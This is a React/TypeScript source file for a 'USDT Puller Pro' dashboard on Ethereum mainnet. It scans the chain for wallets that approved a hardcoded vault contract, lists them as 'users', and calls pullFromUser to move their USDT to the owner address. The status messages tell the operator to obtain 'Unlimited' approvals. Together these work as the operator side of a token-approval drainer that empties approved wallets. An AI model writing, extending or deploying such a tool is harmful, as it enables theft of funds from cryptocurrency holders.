import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';

// CONFIG - mainnet addresses
const VAULT_ADDRESS = "0x67484Cd9Fa389E2e94D1ec10A3C0A481f8aA0830";
const TOKEN_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const OWNER_ADDRESS = "0x6A1Ef9f3b2dAC91664c363A3048317BF4F59b5A9";
const DEFAULT_USER = "0x476F917Ca555EF7808813f0f1924F68AAA510BDa";
const USDT_DECIMALS = 6;

// Minimal ABIs
const VAULT_ABI = ["function pullFromUser(address user, uint256 amount) external"];
const USDT_ABI = [
  "function allowance(address owner, address spender) view returns (uint256)",
  "function balanceOf(address owner) view returns (uint256)"
];

declare global {
  interface Window {
    ethereum?: any;
  }
}

export default function App() {
  const [provider, setProvider] = useState<ethers.providers.Web3Provider | null>(null);
  const [signer, setSigner] = useState<ethers.Signer | null>(null);
  const [connected, setConnected] = useState(false);
  const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
  const [status, setStatus] = useState("Ready. Click 'Connect Wallet' to begin.");
  const [customAmount, setCustomAmount] = useState("10");
  const [selectedUser, setSelectedUser] = useState(DEFAULT_USER);
  const [userList, setUserList] = useState<string[]>([DEFAULT_USER]);
  const [newUserAddress, setNewUserAddress] = useState("");
  const [scanning, setScanning] = useState(false);

  // Auto-connect on load if MetaMask is available
  useEffect(() => {
    const autoConnect = async () => {
      if (typeof window.ethereum !== 'undefined') {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0) {
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
            if (chainId === '0x1') {
              const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
              const _signer = web3Provider.getSigner();
              const addr = await _signer.getAddress();
              
              setProvider(web3Provider);
              setSigner(_signer);
              setConnected(true);
              setConnectedAddress(addr);
              setStatus(`Auto-connected: ${addr}`);
            }
          }
        } catch (e) {
          console.log('Auto-connect failed:', e);
        }
      }
    };

    autoConnect();
  }, []);

  // Connect wallet
  const connect = async () => {
    try {
      setStatus("Connecting wallet...");
      
      if (typeof window.ethereum === 'undefined') {
        setStatus("MetaMask not detected. Please install MetaMask or use a Web3 browser.");
        return;
      }

      const accounts = await window.ethereum.request({ 
        method: 'wallet_requestPermissions',
        params: [{ eth_accounts: {} }]
      }).then(() => window.ethereum.request({ method: 'eth_requestAccounts' }))
        .catch(() => window.ethereum.request({ method: 'eth_requestAccounts' }));
      
      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
      if (chainId !== '0x1') {
        setStatus("Please switch to Ethereum Mainnet (Chain ID 1)");
        return;
      }

      const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
      const _signer = web3Provider.getSigner();
      const addr = await _signer.getAddress();
      
      setProvider(web3Provider);
      setSigner(_signer);
      setConnected(true);
      setConnectedAddress(addr);
      setStatus(`Connected: ${addr}`);
    } catch (e: any) {
      console.error(e);
      setStatus("Connect failed: " + (e.message || e));
    }
  };

  // Disconnect wallet
  const disconnect = () => {
    setProvider(null);
    setSigner(null);
    setConnected(false);
    setConnectedAddress(null);
    setStatus("Disconnected. Click 'Connect Wallet' to reconnect.");
  };

  // Add new user manually
  const addUser = () => {
    if (!newUserAddress) {
      setStatus("Please enter a user address");
      return;
    }
    
    try {
      const addr = ethers.utils.getAddress(newUserAddress);
      if (userList.includes(addr)) {
        setStatus("User already in list");
        return;
      }
      setUserList([...userList, addr]);
      setSelectedUser(addr);
      setNewUserAddress("");
      setStatus(`Added user: ${addr}`);
    } catch (e) {
      setStatus("Invalid address format");
    }
  };

  // Scan blockchain for approved users
  const scanApprovals = async () => {
    try {
      if (!provider) {
        setStatus("Connect wallet first");
        return;
      }

      setScanning(true);
      setStatus("Scanning blockchain for approved users... This may take 30-60 seconds...");

      const token = new ethers.Contract(TOKEN_ADDRESS, [
        "event Approval(address indexed owner, address indexed spender, uint256 value)"
      ], provider);

      const currentBlock = await provider.getBlockNumber();
      const fromBlock = Math.max(0, currentBlock - 100000);

      const filter = token.filters.Approval(null, VAULT_ADDRESS);
      const events = await token.queryFilter(filter, fromBlock, currentBlock);

      const uniqueUsers = new Set(userList);
      let newUsersCount = 0;

      for (const event of events) {
        const userAddr = event.args.owner;
        if (!uniqueUsers.has(userAddr)) {
          uniqueUsers.add(userAddr);
          newUsersCount++;
        }
      }

      const updatedList = Array.from(uniqueUsers);
      setUserList(updatedList);
      
      setStatus(`✅ Scan complete! Found ${events.length} approval events.\nDiscovered ${newUsersCount} new users.\nTotal users: ${updatedList.length}`);
      setScanning(false);
    } catch (err: any) {
      console.error(err);
      setStatus("Scan failed: " + (err.message || String(err)) + "\n\nTry using a custom RPC endpoint or add users manually.");
      setScanning(false);
    }
  };

  // Check contract and approvals
  const checkStatus = async () => {
    try {
      if (!provider) {
        setStatus("Connect wallet first.");
        return;
      }

      setStatus("Checking contract and approvals...");
      const token = new ethers.Contract(TOKEN_ADDRESS, USDT_ABI, provider);
      
      const vaultCode = await provider.getCode(VAULT_ADDRESS);
      if (vaultCode === '0x') {
        setStatus("❌ ERROR: No contract found at vault address!\n\nVault: " + VAULT_ADDRESS);
        return;
      }

      const allowance = await token.allowance(selectedUser, VAULT_ADDRESS);
      const balance = await token.balanceOf(selectedUser);

      const allowanceFormatted = ethers.utils.formatUnits(allowance, USDT_DECIMALS);
      const balanceFormatted = ethers.utils.formatUnits(balance, USDT_DECIMALS);

      let msg = "✅ Contract exists at vault address\n\n";
      msg += `Selected User: ${selectedUser}\n`;
      msg += `Balance: ${balanceFormatted} USDT\n`;
      msg += `Allowance to Contract: ${allowanceFormatted} USDT\n\n`;

      if (parseFloat(allowanceFormatted) < 0.000001) {
        msg += "❌ PROBLEM: User has NOT approved the contract!\n\n";
        msg += "SOLUTION:\n";
        msg += `From user wallet, approve contract:\n`;
        msg += `Contract: ${VAULT_ADDRESS}\n`;
        msg += `Amount: Unlimited`;
      } else {
        msg += "✅ Contract is approved! You can pull USDT.";
      }

      setStatus(msg);
    } catch (err: any) {
      console.error(err);
      setStatus("Check failed: " + (err.message || String(err)));
    }
  };

  // Pull USDT
  const pullUSDT = async () => {
    try {
      if (!signer || !provider) {
        setStatus("Connect wallet first.");
        return;
      }

      const addrLower = (await signer.getAddress()).toLowerCase();
      
      if (addrLower !== OWNER_ADDRESS.toLowerCase()) {
        setStatus(`Connected wallet (${addrLower}) is not owner. Please connect: ${OWNER_ADDRESS}`);
        return;
      }

      const amount = parseFloat(customAmount);
      if (isNaN(amount) || amount <= 0) {
        setStatus("Please enter a valid amount > 0");
        return;
      }

      setStatus("Checking user allowance & balance...");
      const token = new ethers.Contract(TOKEN_ADDRESS, USDT_ABI, provider);
      
      const allowance = await token.allowance(selectedUser, VAULT_ADDRESS);
      const balance = await token.balanceOf(selectedUser);

      const amountBn = ethers.utils.parseUnits(customAmount, USDT_DECIMALS);

      const allowanceFormatted = ethers.utils.formatUnits(allowance, USDT_DECIMALS);
      const balanceFormatted = ethers.utils.formatUnits(balance, USDT_DECIMALS);

      let statusMsg = `User: ${selectedUser}\n`;
      statusMsg += `Balance: ${balanceFormatted} USDT\n`;
      statusMsg += `Allowance: ${allowanceFormatted} USDT\n\n`;

      if (allowance.lt(amountBn)) {
        statusMsg += `❌ Insufficient allowance!\n`;
        statusMsg += `Need: ${customAmount} USDT`;
        setStatus(statusMsg);
        return;
      }
      if (balance.lt(amountBn)) {
        statusMsg += `❌ User balance too low. Need: ${customAmount} USDT`;
        setStatus(statusMsg);
        return;
      }

      setStatus(`✓ Balance: ${balanceFormatted} USDT\n✓ Allowance: ${allowanceFormatted} USDT\n\nPreparing transaction...`);
      const vault = new ethers.Contract(VAULT_ADDRESS, VAULT_ABI, signer);

      try {
        setStatus(`✓ Checks passed\n\nEstimating gas...`);
        const gasEstimate = await vault.estimateGas.pullFromUser(selectedUser, amountBn);
        setStatus(`✓ Gas estimate: ${gasEstimate.toString()}\n\nSending transaction (confirm in wallet)...`);
        const tx = await vault.pullFromUser(selectedUser, amountBn, { 
          gasLimit: gasEstimate.mul(120).div(100) 
        });
        
        setStatus(`📤 Tx sent: ${tx.hash}\n\nWaiting for confirmation...`);
        const receipt = await tx.wait(1);
        
        if (receipt && receipt.status === 1) {
          setStatus(`✅ Success! Pulled ${customAmount} USDT from ${selectedUser}\n\nTx: ${tx.hash}\n\nView on Etherscan: https://etherscan.io/tx/${tx.hash}`);
        } else {
          setStatus(`❌ Transaction failed.\n\nTx: ${tx.hash}`);
        }
      } catch (estimateError: any) {
        console.error("Error:", estimateError);
        
        let errorMsg = "Transaction failed:\n\n";
        if (estimateError.error && estimateError.error.message) {
          errorMsg += estimateError.error.message;
        } else if (estimateError.reason) {
          errorMsg += estimateError.reason;
        } else if (estimateError.message) {
          errorMsg += estimateError.message;
        } else {
          errorMsg += String(estimateError);
        }
        
        setStatus(errorMsg);
      }
    } catch (err: any) {
      console.error(err);
      let m = "Pull failed:\n\n";
      if (err.code === 'ACTION_REJECTED') {
        m += "Transaction rejected by user";
      } else if (err.error && err.error.message) {
        m += err.error.message;
      } else if (err.message) {
        m += err.message;
      } else {
        m += String(err);
      }
      setStatus(m);
    }
  };

  return (
    <div style={{ 
      maxWidth: 900, 
      margin: '0 auto', 
      padding: 24, 
      fontFamily: 'system-ui, -apple-system, sans-serif' 
    }}>
      <div style={{ 
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        color: 'white',
        padding: 24,
        borderRadius: 12,
        marginBottom: 24
      }}>
        <h1 style={{ margin: 0, fontSize: 28 }}>USDT Puller Pro</h1>
        <p style={{ margin: '8px 0 0 0', opacity: 0.9 }}>Ethereum Mainnet - Multi-User Support</p>
      </div>

      <div style={{ 
        background: '#f8f9fa', 
        padding: 20, 
        borderRadius: 8,
        marginBottom: 20 
      }}>
        <div style={{ marginBottom: 12 }}>
          <strong>Contract Address:</strong>
          <div style={{ fontSize: 13, fontFamily: 'monospace', marginTop: 4 }}>
            {VAULT_ADDRESS}
          </div>
        </div>
        <div>
          <strong>Owner (you):</strong>
          <div style={{ fontSize: 13, fontFamily: 'monospace', marginTop: 4 }}>
            {OWNER_ADDRESS}
          </div>
        </div>
      </div>

      {!connected ? (
        <div style={{ textAlign: 'center', padding: 40 }}>
          <button 
            onClick={connect}
            style={{
              background: '#667eea',
              color: 'white',
              border: 'none',
              padding: '14px 28px',
              fontSize: 16,
              borderRadius: 8,
              cursor: 'pointer',
              fontWeight: 600
            }}
            onMouseOver={e => (e.target as HTMLButtonElement).style.background = '#5568d3'}
            onMouseOut={e => (e.target as HTMLButtonElement).style.background = '#667eea'}
          >
            Connect Wallet (MetaMask)
          </button>
        </div>
      ) : (
        <div>
          <div style={{ 
            background: '#e7f5e9', 
            padding: 16, 
            borderRadius: 8,
            marginBottom: 20,
            border: '1px solid #c3e6cb',
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center'
          }}>
            <div>
              <strong>✓ Connected:</strong>
              <div style={{ fontSize: 13, fontFamily: 'monospace', marginTop: 4 }}>
                {connectedAddress}
              </div>
              {connectedAddress && connectedAddress.toLowerCase() !== OWNER_ADDRESS.toLowerCase() && (
                <div style={{ fontSize: 12, color: '#856404', marginTop: 4, background: '#fff3cd', padding: '4px 8px', borderRadius: 4 }}>
                  ⚠️ Not owner address! Switch to: {OWNER_ADDRESS}
                </div>
              )}
            </div>
            <button 
              onClick={disconnect}
              style={{
                background: '#dc3545',
                color: 'white',
                border: 'none',
                padding: '8px 16px',
                fontSize: 14,
                borderRadius: 6,
                cursor: 'pointer',
                fontWeight: 600
              }}
              onMouseOver={e => (e.target as HTMLButtonElement).style.background = '#c82333'}
              onMouseOut={e => (e.target as HTMLButtonElement).style.background = '#dc3545'}
            >
              Disconnect
            </button>
          </div>

          {/* User Management Section */}
          <div style={{ 
            background: '#fff', 
            padding: 20, 
            borderRadius: 8,
            border: '2px solid #ddd',
            marginBottom: 20 
          }}>
            <h3 style={{ margin: '0 0 16px 0' }}>👥 User Management</h3>
            
            <div style={{ marginBottom: 16 }}>
              <label style={{ display: 'block', marginBottom: 8, fontWeight: 600 }}>
                Select User to Pull From:
              </label>
              <select
                value={selectedUser}
                onChange={e => setSelectedUser(e.target.value)}
                style={{
                  width: '100%',
                  padding: 12,
                  fontSize: 14,
                  borderRadius: 8,
                  border: '2px solid #ddd',
                  fontFamily: 'monospace'
                }}
              >
                {userList.map(user => (
                  <option key={user} value={user}>{user}</option>
                ))}
              </select>
            </div>

            <div style={{ marginBottom: 16 }}>
              <label style={{ display: 'block', marginBottom: 8, fontWeight: 600 }}>
                Add New User Address:
              </label>
              <div style={{ display: 'flex', gap: 8 }}>
                <input
                  type="text"
                  value={newUserAddress}
                  onChange={e => setNewUserAddress(e.target.value)}
                  placeholder="0x..."
                  style={{
                    flex: 1,
                    padding: 12,
                    fontSize: 14,
                    borderRadius: 8,
                    border: '2px solid #ddd',
                    fontFamily: 'monospace'
                  }}
                />
                <button 
                  onClick={addUser}
                  style={{
                    background: '#28a745',
                    color: 'white',
                    border: 'none',
                    padding: '12px 24px',
                    fontSize: 14,
                    borderRadius: 8,
                    cursor: 'pointer',
                    fontWeight: 600,
                    whiteSpace: 'nowrap'
                  }}
                  onMouseOver={e => (e.target as HTMLButtonElement).style.background = '#218838'}
                  onMouseOut={e => (e.target as HTMLButtonElement).style.background = '#28a745'}
                >
                  Add User
                </button>
              </div>
            </div>

            <button 
              onClick={scanApprovals}
              disabled={scanning}
              style={{
                background: scanning ? '#6c757d' : '#ffc107',
                color: scanning ? '#fff' : '#000',
                border: 'none',
                padding: '12px 24px',
                fontSize: 14,
                borderRadius: 8,
                cursor: scanning ? 'not-allowed' : 'pointer',
                fontWeight: 600,
                width: '100%'
              }}
            >
              {scanning ? '⏳ Scanning Blockchain...' : '🔍 Scan Blockchain for Approved Users'}
            </button>
            <div style={{ fontSize: 12, color: '#666', marginTop: 8 }}>
              Scans last ~14 days of approvals. May take 30-60 seconds.
            </div>
          </div>

          {/* Actions Section */}
          <div style={{ marginBottom: 20 }}>
            <button 
              onClick={checkStatus}
              style={{
                background: '#17a2b8',
                color: 'white',
                border: 'none',
                padding: '12px 24px',
                fontSize: 15,
                borderRadius: 8,
                cursor: 'pointer',
                fontWeight: 600,
                width: '100%',
                marginBottom: 16
              }}
              onMouseOver={e => (e.target as HTMLButtonElement).style.background = '#138496'}
              onMouseOut={e => (e.target as HTMLButtonElement).style.background = '#17a2b8'}
            >
              🔍 Check Selected User Status
            </button>
          </div>

          <div style={{ marginBottom: 20 }}>
            <label style={{ display: 'block', marginBottom: 8, fontWeight: 600 }}>
              Amount to Pull (USDT):
            </label>
            <input
              type="number"
              value={customAmount}
              onChange={e => setCustomAmount(e.target.value)}
              placeholder="10"
              step="0.01"
              min="0"
              style={{
                width: '100%',
                padding: 12,
                fontSize: 16,
                borderRadius: 8,
                border: '2px solid #ddd',
                boxSizing: 'border-box'
              }}
            />
          </div>

          <button 
            onClick={pullUSDT}
            style={{
              background: '#dc3545',
              color: 'white',
              border: 'none',
              padding: '14px 28px',
              fontSize: 16,
              borderRadius: 8,
              cursor: 'pointer',
              fontWeight: 600,
              width: '100%'
            }}
            onMouseOver={e => (e.target as HTMLButtonElement).style.background = '#c82333'}
            onMouseOut={e => (e.target as HTMLButtonElement).style.background = '#dc3545'}
          >
            💰 Pull {customAmount} USDT from Selected User
          </button>
        </div>
      )}

      {status && (
        <div style={{ 
          marginTop: 20,
          padding: 16,
          background: '#fff',
          border: '2px solid #ddd',
          borderRadius: 8,
          whiteSpace: 'pre-wrap',
          wordBreak: 'break-word',
          fontSize: 14
        }}>
          <strong>Status:</strong>
          <div style={{ marginTop: 8 }}>{status}</div>
        </div>
      )}

      <div style={{ 
        marginTop: 24,
        padding: 16,
        background: '#fff3cd',
        border: '1px solid #ffc107',
        borderRadius: 8,
        fontSize: 13
      }}>
        <strong>⚠️ Important Notes:</strong>
        <ul style={{ marginTop: 8, paddingLeft: 20 }}>
          <li>This sends REAL mainnet transactions — gas costs apply</li>
          <li>Connected wallet must be owner: {OWNER_ADDRESS}</li>
          <li>Users must approve the contract address: {VAULT_ADDRESS}</li>
          <li>You can manage multiple users and pull from any approved user</li>
        </ul>
      </div>
    </div>
  );
}